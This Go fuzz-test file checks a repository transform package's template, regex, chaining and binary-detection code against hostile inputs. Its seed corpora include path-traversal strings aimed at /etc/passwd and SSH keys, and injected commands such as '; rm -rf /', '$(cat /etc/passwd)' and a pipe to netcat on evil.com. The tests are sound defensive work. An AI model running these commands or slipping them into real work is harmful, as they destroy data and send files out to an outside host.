//go:build go1.18

package transform

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"strings"
	"testing"
	"time"

	"github.com/sirupsen/logrus"

	"github.com/mrz1836/go-broadcast/internal/fuzz"
)

var (
	ErrTestError = errors.New("test error")
	ErrTimeout   = errors.New("timeout")
)

func FuzzTemplateVariableReplacement(f *testing.F) {
	// Add seed corpus for template variable replacement scenarios
	seeds := []struct {
		template string
		vars     map[string]string
	}{
		// Valid template patterns
		{
			template: "Hello {{NAME}}!",
			vars:     map[string]string{"NAME": "World"},
		},
		{
			template: "Service: ${SERVICE_NAME}",
			vars:     map[string]string{"SERVICE_NAME": "api"},
		},
		{
			template: "{{VAR1}} and {{VAR2}}",
			vars:     map[string]string{"VAR1": "foo", "VAR2": "bar"},
		},

		// Path traversal attempts in variables
		{
			template: "Path: {{PATH}}",
			vars:     map[string]string{"PATH": "../../../etc/passwd"},
		},
		{
			template: "File: ${FILE_PATH}",
			vars:     map[string]string{"FILE_PATH": "../../root/.ssh/id_rsa"},
		},
		{
			template: "Dir: {{DIRECTORY}}",
			vars:     map[string]string{"DIRECTORY": "~/../../etc/shadow"},
		},

		// Command injection attempts in variables
		{
			template: "Cmd: {{CMD}}",
			vars:     map[string]string{"CMD": "; rm -rf /"},
		},
		{
			template: "Script: ${SCRIPT}",
			vars:     map[string]string{"SCRIPT": "`whoami`"},
		},
		{
			template: "Exec: {{COMMAND}}",
			vars:     map[string]string{"COMMAND": "$(cat /etc/passwd)"},
		},
		{
			template: "Run: ${RUN}",
			vars:     map[string]string{"RUN": "| nc evil.com 9999"},
		},

		// Infinite recursion attempts
		{
			template: "{{VAR1}}",
			vars:     map[string]string{"VAR1": "{{VAR2}}", "VAR2": "{{VAR1}}"},
		},
		{
			template: "${A}",
			vars:     map[string]string{"A": "${B}", "B": "${C}", "C": "${A}"},
		},
		{
			template: "{{SELF}}",
			vars:     map[string]string{"SELF": "{{SELF}}"},
		},

		// Large expansion attempts
		{
			template: "{{EXPAND}}",
			vars:     map[string]string{"EXPAND": strings.Repeat("LARGE", 1000)},
		},
		{
			template: "{{A}}{{A}}{{A}}",
			vars:     map[string]string{"A": strings.Repeat("x", 100)},
		},

		// Unicode and special characters
		{
			template: "Unicode: {{UNICODE}}",
			vars:     map[string]string{"UNICODE": "🎉🎊🎈"},
		},
		{
			template: "Special: ${SPECIAL}",
			vars:     map[string]string{"SPECIAL": "café résumé"},
		},
		{
			template: "Null: {{NULL}}",
			vars:     map[string]string{"NULL": "test\x00null"},
		},

		// Mixed syntax
		{
			template: "{{VAR1}} and ${VAR2}",
			vars:     map[string]string{"VAR1": "hello", "VAR2": "world"},
		},

		// Edge cases
		{
			template: "",
			vars:     map[string]string{"EMPTY": "value"},
		},
		{
			template: "{{}}",
			vars:     map[string]string{"": "empty_key"},
		},
		{
			template: "{{VAR}}",
			vars:     map[string]string{},
		},
		{
			template: "No variables here",
			vars:     map[string]string{"UNUSED": "value"},
		},

		// Variable precedence testing
		{
			template: "{{SERVICE}} and {{SERVICE_NAME}}",
			vars:     map[string]string{"SERVICE": "short", "SERVICE_NAME": "long"},
		},
	}

	for _, seed := range seeds {
		templateBytes := []byte(seed.template)
		varsBytes, err := json.Marshal(seed.vars)
		if err != nil {
			continue // Skip invalid seed data
		}
		f.Add(templateBytes, varsBytes)
	}

	f.Fuzz(func(t *testing.T, templateData, varsData []byte) {
		// Skip long inputs to avoid timeout in CI
		if len(templateData)+len(varsData) > 20000 {
			t.Skip("Input too large")
		}

		defer func() {
			if r := recover(); r != nil {
				t.Fatalf("Panic in template replacement: %v", r)
			}
		}()

		// Parse variables JSON
		var vars map[string]string
		if err := json.Unmarshal(varsData, &vars); err != nil {
			// Invalid vars JSON is acceptable for fuzzing
			return
		}

		// Create template transformer
		logger := logrus.New()
		logger.SetLevel(logrus.ErrorLevel) // Reduce noise during fuzzing
		transformer := NewTemplateTransformer(logger, nil)

		// Create context
		ctx := Context{
			SourceRepo: "org/source",
			TargetRepo: "org/target",
			FilePath:   "test.txt",
			Variables:  vars,
		}

		// Apply transformation
		result, err := transformer.Transform(templateData, ctx)
		if err != nil {
			// Transformation errors are acceptable for fuzzing
			return
		}

		// Validate result for security issues
		validateTemplateResult(t, string(templateData), vars, string(result))
	})
}

func FuzzRegexReplacement(f *testing.F) {
	// Add seed corpus for regex replacement scenarios
	seeds := []struct {
		sourceOrg  string
		sourceRepo string
		targetOrg  string
		targetRepo string
		content    string
		filePath   string
	}{
		// Valid Go file transformations
		{
			sourceOrg:  "oldorg",
			sourceRepo: "oldrepo",
			targetOrg:  "neworg",
			targetRepo: "newrepo",
			content:    `module github.com/oldorg/oldrepo`,
			filePath:   "go.mod",
		},
		{
			sourceOrg:  "company",
			sourceRepo: "service",
			targetOrg:  "team",
			targetRepo: "api",
			content:    `import "github.com/company/service/pkg/utils"`,
			filePath:   "main.go",
		},

		// Command injection attempts in repository names
		{
			sourceOrg:  "org",
			sourceRepo: "repo; rm -rf /",
			targetOrg:  "safe",
			targetRepo: "name",
			content:    `import "github.com/org/repo; rm -rf //pkg"`,
			filePath:   "main.go",
		},
		{
			sourceOrg:  "org`whoami`",
			sourceRepo: "repo",
			targetOrg:  "clean",
			targetRepo: "safe",
			content:    `module github.com/org` + "`whoami`" + `/repo`,
			filePath:   "go.mod",
		},

		// Path traversal in repository names
		{
			sourceOrg:  "../../../etc",
			sourceRepo: "passwd",
			targetOrg:  "safe",
			targetRepo: "repo",
			content:    `import "github.com/../../../etc/passwd"`,
			filePath:   "main.go",
		},

		// Special characters in repo names
		{
			sourceOrg:  "org\x00null",
			sourceRepo: "repo",
			targetOrg:  "clean",
			targetRepo: "safe",
			content:    "module github.com/org\x00null/repo",
			filePath:   "go.mod",
		},

		// Unicode in repo names
		{
			sourceOrg:  "org",
			sourceRepo: "🎉repo",
			targetOrg:  "target",
			targetRepo: "clean",
			content:    "import \"github.com/org/🎉repo/pkg\"",
			filePath:   "main.go",
		},

		// Documentation file patterns
		{
			sourceOrg:  "oldorg",
			sourceRepo: "oldrepo",
			targetOrg:  "neworg",
			targetRepo: "newrepo",
			content:    "See https://github.com/oldorg/oldrepo for details",
			filePath:   "README.md",
		},

		// Configuration file patterns
		{
			sourceOrg:  "company",
			sourceRepo: "service",
			targetOrg:  "team",
			targetRepo: "api",
			content:    `{"repository": "company/service"}`,
			filePath:   "config.json",
		},

		// Large content for performance testing
		{
			sourceOrg:  "large",
			sourceRepo: "repo",
			targetOrg:  "target",
			targetRepo: "dest",
			content:    strings.Repeat("github.com/large/repo ", 1000),
			filePath:   "large.go",
		},

		// Edge cases
		{
			sourceOrg:  "",
			sourceRepo: "",
			targetOrg:  "new",
			targetRepo: "repo",
			content:    "empty source repo",
			filePath:   "test.txt",
		},
		{
			sourceOrg:  "same",
			sourceRepo: "repo",
			targetOrg:  "same",
			targetRepo: "repo",
			content:    "github.com/same/repo",
			filePath:   "test.go",
		},
	}

	for _, seed := range seeds {
		f.Add(seed.sourceOrg, seed.sourceRepo, seed.targetOrg, seed.targetRepo, seed.content, seed.filePath)
	}

	f.Fuzz(func(t *testing.T, sourceOrg, sourceRepo, targetOrg, targetRepo, content, filePath string) {
		// Skip long inputs to avoid timeout in CI
		totalLen := len(sourceOrg) + len(sourceRepo) + len(targetOrg) + len(targetRepo) + len(content) + len(filePath)
		if totalLen > 20000 {
			t.Skip("Input too large")
		}

		defer func() {
			if r := recover(); r != nil {
				// Check if panic is due to invalid UTF-8 (expected for fuzz testing)
				panicStr := fmt.Sprintf("%v", r)
				if strings.Contains(panicStr, "invalid UTF-8") || strings.Contains(panicStr, "regexp: Compile") {
					t.Logf("Security: Panic due to invalid UTF-8 in regex: %v", r)
					return
				}
				t.Fatalf("Unexpected panic in regex replacement: %v", r)
			}
		}()

		// Create repo transformer
		transformer := NewRepoTransformer()

		// Create context
		ctx := Context{
			SourceRepo: sourceOrg + "/" + sourceRepo,
			TargetRepo: targetOrg + "/" + targetRepo,
			FilePath:   filePath,
			Variables:  map[string]string{},
		}

		// Apply transformation
		result, err := transformer.Transform([]byte(content), ctx)
		if err != nil {
			// Transformation errors are acceptable for fuzzing
			validateRegexError(t, err, sourceOrg, sourceRepo, targetOrg, targetRepo)
			return
		}

		// Validate result for security issues
		validateRegexResult(t, content, string(result), sourceOrg, sourceRepo, targetOrg, targetRepo)
	})
}

func FuzzTransformChain(f *testing.F) {
	// Add seed corpus for transform chain scenarios
	seeds := []struct {
		content      string
		sourceRepo   string
		targetRepo   string
		variables    map[string]string
		filePath     string
		transformers []string // transformer types to use
	}{
		// Simple chain with template and repo transformers
		{
			content:      "Module: {{MODULE}} at github.com/old/repo",
			sourceRepo:   "old/repo",
			targetRepo:   "new/service",
			variables:    map[string]string{"MODULE": "mymodule"},
			filePath:     "main.go",
			transformers: []string{"template", "repo"},
		},

		// Chain with all transformers
		{
			content:      "Service {{NAME}} from github.com/company/old",
			sourceRepo:   "company/old",
			targetRepo:   "team/new",
			variables:    map[string]string{"NAME": "api"},
			filePath:     "README.md",
			transformers: []string{"binary", "template", "repo"},
		},

		// Command injection through chain
		{
			content:      "Run {{CMD}} for github.com/safe/repo",
			sourceRepo:   "safe/repo",
			targetRepo:   "evil/injection; rm -rf /",
			variables:    map[string]string{"CMD": "`whoami`"},
			filePath:     "script.sh",
			transformers: []string{"template", "repo"},
		},

		// Path traversal through chain
		{
			content:      "Path: {{PATH}} in github.com/org/repo",
			sourceRepo:   "org/repo",
			targetRepo:   "../../../etc/passwd",
			variables:    map[string]string{"PATH": "../../root/.ssh"},
			filePath:     "config.yaml",
			transformers: []string{"template", "repo"},
		},

		// Large content for performance testing
		{
			content:      "{{BIG}} " + strings.Repeat("github.com/large/repo ", 500),
			sourceRepo:   "large/repo",
			targetRepo:   "target/dest",
			variables:    map[string]string{"BIG": strings.Repeat("LARGE", 100)},
			filePath:     "huge.txt",
			transformers: []string{"template", "repo"},
		},

		// Binary file should be skipped
		{
			content:      "\x00\x01\x02\x03binary content",
			sourceRepo:   "org/repo",
			targetRepo:   "new/repo",
			variables:    map[string]string{},
			filePath:     "binary.bin",
			transformers: []string{"binary", "template", "repo"},
		},

		// Empty transformers chain
		{
			content:      "No transformations",
			sourceRepo:   "org/repo",
			targetRepo:   "new/repo",
			variables:    map[string]string{},
			filePath:     "test.txt",
			transformers: []string{},
		},
	}

	for _, seed := range seeds {
		varsBytes, err := json.Marshal(seed.variables)
		if err != nil {
			continue // Skip invalid seed data
		}
		transformersBytes, err := json.Marshal(seed.transformers)
		if err != nil {
			continue // Skip invalid seed data
		}
		f.Add(seed.content, seed.sourceRepo, seed.targetRepo, string(varsBytes), seed.filePath, string(transformersBytes))
	}

	f.Fuzz(func(t *testing.T, content, sourceRepo, targetRepo, varsJSON, filePath, transformersJSON string) {
		// Skip long inputs to avoid timeout in CI
		totalLen := len(content) + len(sourceRepo) + len(targetRepo) + len(varsJSON) + len(filePath) + len(transformersJSON)
		if totalLen > 20000 {
			t.Skip("Input too large")
		}

		defer func() {
			if r := recover(); r != nil {
				// Check if panic is due to invalid UTF-8 (expected for fuzz testing)
				panicStr := fmt.Sprintf("%v", r)
				if strings.Contains(panicStr, "invalid UTF-8") || strings.Contains(panicStr, "regexp: Compile") {
					t.Logf("Security: Panic due to invalid UTF-8 in transform chain: %v", r)
					return
				}
				t.Fatalf("Unexpected panic in transform chain: %v", r)
			}
		}()

		// Parse JSON inputs
		var variables map[string]string
		if err := json.Unmarshal([]byte(varsJSON), &variables); err != nil {
			variables = make(map[string]string)
		}

		var transformerTypes []string
		if err := json.Unmarshal([]byte(transformersJSON), &transformerTypes); err != nil {
			return // Invalid transformer list
		}

		// Create chain with specified transformers
		logger := logrus.New()
		logger.SetLevel(logrus.ErrorLevel) // Reduce noise during fuzzing
		chain := NewChain(logger)

		for _, transformerType := range transformerTypes {
			switch transformerType {
			case "binary":
				chain.Add(NewBinaryTransformer())
			case "template":
				chain.Add(NewTemplateTransformer(logger, nil))
			case "repo":
				chain.Add(NewRepoTransformer())
			}
		}

		// Create context with timeout
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()

		transformCtx := Context{
			SourceRepo: sourceRepo,
			TargetRepo: targetRepo,
			FilePath:   filePath,
			Variables:  variables,
		}

		// Apply transformation chain
		result, err := chain.Transform(ctx, []byte(content), transformCtx)
		if err != nil {
			// Chain errors are acceptable for fuzzing
			validateChainError(t, err, transformerTypes)
			return
		}

		// Validate result for security issues
		validateChainResult(t, content, string(result), sourceRepo, targetRepo, variables, transformerTypes)
	})
}

func FuzzBinaryDetection(f *testing.F) {
	// Add seed corpus for binary detection scenarios
	seeds := []struct {
		filePath string
		content  string
	}{
		// Text files
		{"test.txt", "Hello, World!"},
		{"script.sh", "#!/bin/bash\necho 'hello'"},
		{"config.json", `{"key": "value"}`},
		{"README.md", "# Project\nDescription here"},
		{"main.go", "package main\nfunc main() {}"},

		// Binary file extensions
		{"image.png", "PNG content"},
		{"archive.zip", "ZIP content"},
		{"binary.exe", "EXE content"},
		{"library.so", "SO content"},

		// Binary content (with null bytes)
		{"data.bin", "\x00\x01\x02\x03binary data"},
		{"image.jpg", "\xFF\xD8\xFF\xE0JFIF"},
		{"archive.tar", "\x1F\x8B\x08\x00gzip"},

		// Edge cases
		{"", ""},
		{"no-extension", "text content"},
		{"mixed.txt", "text\x00with\x01null\x02bytes"},
		{"unicode.txt", "unicode: 🎉 content"},
		{"large.txt", strings.Repeat("a", 10000)},

		// Security payloads
		{"malicious.txt", "../../../etc/passwd"},
		{"injection.sh", "; rm -rf /"},
		{"script.py", "`whoami`"},
		{"null.txt", "test\x00null\x01byte"},

		// High ratio of non-text characters
		{"mostly-binary.dat", strings.Repeat("\x80", 100) + "some text"},
		{"mixed-content.bin", "text" + strings.Repeat("\x00", 50) + "more text"},
	}

	for _, seed := range seeds {
		f.Add(seed.filePath, seed.content)
	}

	f.Fuzz(func(t *testing.T, filePath, content string) {
		// Skip extremely long inputs
		if len(filePath)+len(content) > 50000 {
			t.Skip("Input too large")
		}

		defer func() {
			if r := recover(); r != nil {
				t.Fatalf("Panic in binary detection: %v", r)
			}
		}()

		// Test binary detection
		isBinary := IsBinary(filePath, []byte(content))

		// Validate binary detection for security issues
		validateBinaryDetection(t, filePath, content, isBinary)

		// Test binary transformer
		transformer := NewBinaryTransformer()
		ctx := Context{
			SourceRepo: "org/repo",
			TargetRepo: "new/repo",
			FilePath:   filePath,
			Variables:  map[string]string{},
		}

		result, err := transformer.Transform([]byte(content), ctx)
		if err != nil {
			t.Logf("Binary transformer error: %v", err)
			return
		}

		// Binary transformer should return content unchanged
		if string(result) != content {
			t.Logf("Binary transformer modified content: %q -> %q", content, string(result))
		}
	})
}

// Validation helper functions

func validateTemplateResult(t *testing.T, template string, vars map[string]string, result string) {
	// Check for infinite expansion
	if len(result) > len(template)*100 && len(template) > 0 {
		t.Logf("Security: Possible infinite expansion - template %d bytes -> result %d bytes",
			len(template), len(result))
	}

	// Check for security issues in variables that made it into the result
	for key, value := range vars {
		if !strings.Contains(result, value) {
			continue // Variable wasn't used
		}

		if fuzz.ContainsShellMetachars(value) {
			t.Logf("Security: Shell metacharacters in template result via %s: %q", key, value)
		}

		if fuzz.ContainsPathTraversal(value) {
			t.Logf("Security: Path traversal in template result via %s: %q", key, value)
		}

		if fuzz.ContainsNullByte(value) {
			t.Logf("Security: Null byte in template result via %s: %q", key, value)
		}
	}

	// Check for remaining unreplaced variables that might indicate issues
	if strings.Contains(result, "{{") || strings.Contains(result, "${") {
		// Count unreplaced variables
		braceCount := strings.Count(result, "{{")
		dollarCount := strings.Count(result, "${")
		if braceCount > 10 || dollarCount > 10 {
			t.Logf("Info: Many unreplaced variables - braces: %d, dollars: %d", braceCount, dollarCount)
		}
	}
}

func validateRegexResult(t *testing.T, original, result, sourceOrg, sourceRepo, targetOrg, targetRepo string) {
	// Check for exponential growth
	if len(result) > len(original)*10 && len(original) > 0 {
		t.Logf("Security: Large expansion in regex replacement: %d -> %d bytes", len(original), len(result))
	}

	// Check if security issues were introduced by the replacement
	if !fuzz.ContainsPathTraversal(original) && fuzz.ContainsPathTraversal(result) {
		t.Logf("Security: Path traversal introduced by regex replacement")
	}

	if !fuzz.ContainsShellMetachars(original) && fuzz.ContainsShellMetachars(result) {
		t.Logf("Security: Shell metacharacters introduced by regex replacement")
	}

	// Check source/target repo names for security issues
	repoNames := []string{sourceOrg, sourceRepo, targetOrg, targetRepo}
	for i, name := range repoNames {
		if name == "" {
			continue
		}

		if fuzz.ContainsShellMetachars(name) {
			t.Logf("Security: Shell metacharacters in repo name[%d]: %q", i, name)
		}

		if fuzz.ContainsPathTraversal(name) {
			t.Logf("Security: Path traversal in repo name[%d]: %q", i, name)
		}

		if fuzz.ContainsNullByte(name) {
			t.Logf("Security: Null byte in repo name[%d]: %q", i, name)
		}
	}
}

func validateRegexError(t *testing.T, err error, _, _, _, _ string) {
	// Log if error contains security issues
	errStr := err.Error()
	if fuzz.ContainsShellMetachars(errStr) {
		t.Logf("Security: Shell metacharacters in regex error: %q", errStr)
	}

	if fuzz.ContainsPathTraversal(errStr) {
		t.Logf("Security: Path traversal in regex error: %q", errStr)
	}

	// Check if error is due to invalid repo format (expected)
	if strings.Contains(errStr, "invalid repository format") {
		// This is an expected error for malformed repo names
		return
	}

	t.Logf("Info: Regex transformation error: %v", err)
}

func validateChainResult(t *testing.T, original, result, sourceRepo, targetRepo string, variables map[string]string, transformers []string) {
	// Check for compound expansion issues
	if len(result) > len(original)*50 && len(original) > 0 {
		t.Logf("Security: Large expansion in transform chain: %d -> %d bytes (transformers: %v)",
			len(original), len(result), transformers)
	}

	// Check if multiple security issues were introduced
	securityIssues := 0
	if fuzz.ContainsShellMetachars(result) && !fuzz.ContainsShellMetachars(original) {
		securityIssues++
		t.Logf("Security: Shell metacharacters introduced by transform chain")
	}

	if fuzz.ContainsPathTraversal(result) && !fuzz.ContainsPathTraversal(original) {
		securityIssues++
		t.Logf("Security: Path traversal introduced by transform chain")
	}

	if fuzz.ContainsNullByte(result) && !fuzz.ContainsNullByte(original) {
		securityIssues++
		t.Logf("Security: Null bytes introduced by transform chain")
	}

	if securityIssues > 1 {
		t.Logf("Security: Multiple security issues introduced by chain: %d issues", securityIssues)
	}

	// Validate repo names and variables (handle malformed repo names gracefully)
	sourceParts := strings.Split(sourceRepo, "/")
	targetParts := strings.Split(targetRepo, "/")

	if len(sourceParts) >= 2 && len(targetParts) >= 2 {
		validateRegexResult(t, original, result,
			sourceParts[0], sourceParts[1], targetParts[0], targetParts[1])
	} else {
		// Log malformed repo names as info (expected in fuzzing)
		if len(sourceParts) < 2 {
			t.Logf("Info: Malformed source repo (no slash): %q", sourceRepo)
		}
		if len(targetParts) < 2 {
			t.Logf("Info: Malformed target repo (no slash): %q", targetRepo)
		}
	}

	validateTemplateResult(t, original, variables, result)
}

func validateChainError(t *testing.T, err error, transformers []string) {
	errStr := err.Error()

	// Check for timeout errors (expected with malicious input)
	if strings.Contains(errStr, "context deadline exceeded") || strings.Contains(errStr, "timeout") {
		t.Logf("Info: Transform chain timeout (expected with complex input): %v", err)
		return
	}

	// Log other errors for investigation
	t.Logf("Info: Transform chain error with transformers %v: %v", transformers, err)
}

func validateBinaryDetection(t *testing.T, filePath, content string, isBinary bool) {
	// Check for potential bypass attempts
	if strings.Contains(filePath, "..") {
		t.Logf("Security: Path traversal in file path: %q", filePath)
	}

	if fuzz.ContainsNullByte(content) && !isBinary {
		t.Logf("Security: Content with null bytes not detected as binary: path=%q", filePath)
	}

	// Log detection for certain edge cases
	if len(content) == 0 && isBinary {
		t.Logf("Info: Empty file detected as binary: %q", filePath)
	}

	if len(content) > 10000 {
		t.Logf("Info: Large file detection: %q, binary=%v, size=%d", filePath, isBinary, len(content))
	}

	// Check for security issues in file path
	if fuzz.ContainsShellMetachars(filePath) {
		t.Logf("Security: Shell metacharacters in file path: %q", filePath)
	}
}

// Test to verify validation logic
func TestTransformValidation(t *testing.T) {
	// This test verifies that our validation functions properly identify security patterns
	tests := []struct {
		name     string
		input    string
		expected bool
	}{
		{"clean content", "Hello World", false},
		{"path traversal", "../../../etc/passwd", true},
		{"command injection", "; rm -rf /", true},
		{"null bytes", "test\x00null", true},
		{"unicode", "🎉 test", false},
		{"normal text", "normal text", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			hasShell := fuzz.ContainsShellMetachars(tt.input)
			hasPath := fuzz.ContainsPathTraversal(tt.input)
			hasNull := fuzz.ContainsNullByte(tt.input)

			hasSecurityIssue := hasShell || hasPath || hasNull

			if tt.expected && !hasSecurityIssue {
				t.Errorf("Expected security issue in %q but none found", tt.input)
			}
			if !tt.expected && hasSecurityIssue {
				t.Errorf("Unexpected security issue in %q: shell=%v path=%v null=%v",
					tt.input, hasShell, hasPath, hasNull)
			}
		})
	}
}
